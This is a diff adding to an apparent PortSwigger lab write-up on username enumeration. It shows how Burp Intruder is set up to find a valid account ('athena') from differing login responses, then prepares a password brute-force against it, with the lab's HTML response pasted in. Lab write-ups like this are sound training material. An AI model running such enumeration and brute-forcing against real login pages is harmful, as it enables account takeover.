@@ -30,4 +30,81 @@ username=$hello$&password=1234
 
 $ represents the special symbol
 ```
-I then pasted the candidate username list into the Burp Intruder payload configuration tab
+I then pasted the candidate username list into the Burp Intruder payload configuration tab before starting the attack. Once the attack is finished, I examined all the HTTP responses from the server to find which request has a different response compared to the others. By using a search filter, I looked for requests that does not have the term 'Invalid username'. This led to me to request 92, where the login request returned an 'Invalid password'.
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3246
+
+<!DOCTYPE html>
+<html>
+<!--LAB_HEAD_START-->
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labs.css rel=stylesheet>
+        <title>Username enumeration via different responses</title>
+    </head>
+<!--LAB_HEAD_END-->
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <!--LAB_HEADER_START-->
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>Username enumeration via different responses</h2>
+                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <!--LAB_HEADER_END-->
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <h1>Login</h1>
+                    <section>
+                        <p class=is-warning>Incorrect password</p>
+                        <form class=login-form method=POST action="/login">
+                            <label>Username</label>
+                            <input required type=username name="username" autofocus>
+                            <label>Password</label>
+                            <input required type=password name="password">
+                            <button class=button type=submit> Log in </button>
+                        </form>
+                    </section>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
+```
+This tells us that the account usernam 'athena' exists, which allows us to focus the password brute-force attack on this account solely.  
+
+Next, I reconfigured the request body in the Burp Intruder, only wrapping the password parameter in the special character whilst keeping the username as 'athena'. Then I added in the password list from the given candidate password list then started the attack again. 
